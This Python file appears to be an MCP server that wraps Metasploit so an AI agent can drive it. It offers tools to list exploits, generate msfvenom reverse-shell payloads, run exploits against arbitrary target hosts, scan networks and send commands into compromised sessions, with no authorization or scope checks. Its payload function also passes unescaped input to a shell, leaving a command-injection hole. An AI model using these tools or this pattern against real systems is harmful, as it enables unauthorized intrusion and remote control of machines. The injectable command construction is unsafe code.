import subprocess
import json
import os
from mcp.server.fastmcp import FastMCP
from pymetasploit3.msfrpc import MsfRpcClient

# Initialize MCP server
mcp = FastMCP("Metasploit Tools")

# Global Metasploit client
# Note: You need to start the msfrpcd service before running this:
# msfrpcd -P your_password -S -a 127.0.0.1


msf_client = MsfRpcClient(
    password=os.getenv('MSF_PASSWORD', 'your_password'),
    server=os.getenv('MSF_SERVER', '127.0.0.1'),
    port=int(os.getenv('MSF_PORT', 55553))
)

@mcp.tool()
def list_exploits(search_term: str = "") -> list:
    """
    List available Metasploit exploits, optionally filtered by search term.
    
    Args:
        search_term: Optional term to filter exploits
    
    Returns:
        List of exploit names matching the search term
    """
    exploits = msf_client.modules.exploits
    if search_term:
        return [e for e in exploits if search_term.lower() in e.lower()]
    return exploits[:100]  # Limit results if no search term

@mcp.tool()
def list_payloads(platform: str = "", arch: str = "") -> list:
    """
    List available Metasploit payloads, optionally filtered by platform and architecture.
    
    Args:
        platform: Optional platform filter (e.g., 'windows', 'linux')
        arch: Optional architecture filter (e.g., 'x86', 'x64')
    
    Returns:
        List of payload names matching the filters
    """
    payloads = msf_client.modules.payloads
    filtered = payloads
    
    if platform:
        filtered = [p for p in filtered if platform.lower() in p.lower()]
    if arch:
        filtered = [p for p in filtered if arch.lower() in p.lower()]
    
    return filtered[:100]  # Limit results

# todo: add so it runs msfvenom in a ssh session
@mcp.tool()
def generate_payload(payload_type: str, lhost: str, lport: int, format_type: str = "raw") -> str:
    """
    Generate a Metasploit payload using msfvenom.
    
    Args:
        payload_type: Type of payload (e.g., windows/meterpreter/reverse_tcp)
        lhost: Listener host IP address
        lport: Listener port
        format_type: Output format (raw, exe, python, etc.)
    
    Returns:
        Information about the generated payload
    """
    cmd = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f {format_type}"
    try:
        result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
        return f"Payload generated successfully. Output: {result.stdout[:200]}..."
    except subprocess.CalledProcessError as e:
        return f"Error generating payload: {e.stderr}"

@mcp.tool()
def run_exploit(exploit_name: str, target_host: str, target_port: int, payload: str = None) -> str:
    """
    Configure and run a Metasploit exploit against a target.
    
    Args:
        exploit_name: Name of the exploit to use
        target_host: Target IP address
        target_port: Target port
        payload: Optional payload to use
    
    Returns:
        Result of the exploit attempt
    """
    # Create a new console
    console_id = msf_client.consoles.console().get('id')
    console = msf_client.consoles.console(console_id)
    
    # Setup commands
    commands = [
        f"use {exploit_name}",
        f"set RHOSTS {target_host}",
        f"set RPORT {target_port}"
    ]
    
    if payload:
        commands.append(f"set PAYLOAD {payload}")
    
    # Run commands
    results = []
    for cmd in commands:
        result = console.run_single_command(cmd)
        results.append(result.get('data', ''))
    
    # Run the exploit
    exploit_result = console.run_single_command("run")
    results.append(exploit_result.get('data', ''))
    
    return "\n".join(results)

@mcp.tool()
def scan_target(target: str, scan_type: str = "basic") -> str:
    """
    Scan a target using Metasploit's auxiliary scanners.
    
    Args:
        target: Target IP or IP range (e.g., 192.168.1.1 or 192.168.1.0/24)
        scan_type: Type of scan (basic, comprehensive, service)
    
    Returns:
        Scan results
    """
    console_id = msf_client.consoles.console().get('id')
    console = msf_client.consoles.console(console_id)
    
    scan_modules = {
        "basic": "auxiliary/scanner/portscan/tcp",
        "comprehensive": "auxiliary/scanner/discovery/udp_sweep", 
        "service": "auxiliary/scanner/discovery/udp_probe"
    }
    
    module = scan_modules.get(scan_type.lower(), scan_modules["basic"])
    
    commands = [
        f"use {module}",
        f"set RHOSTS {target}",
        "run"
    ]
    
    results = []
    for cmd in commands:
        result = console.run_single_command(cmd)
        results.append(result.get('data', ''))
    
    return "\n".join(results)

@mcp.tool()
def list_active_sessions() -> dict:
    """
    List active Metasploit sessions.
    
    Returns:
        Dictionary of active sessions
    """
    return msf_client.sessions.list

@mcp.tool()
def send_session_command(session_id: int, command: str) -> str:
    """
    Send a command to an active Metasploit session.
    
    Args:
        session_id: ID of the session
        command: Command to execute
    
    Returns:
        Command output
    """
    try:
        session = msf_client.sessions.session(str(session_id))
        result = session.run_with_output(command)
        return result
    except Exception as e:
        return f"Error executing command: {str(e)}"

if __name__ == "__main__":
    mcp.run()
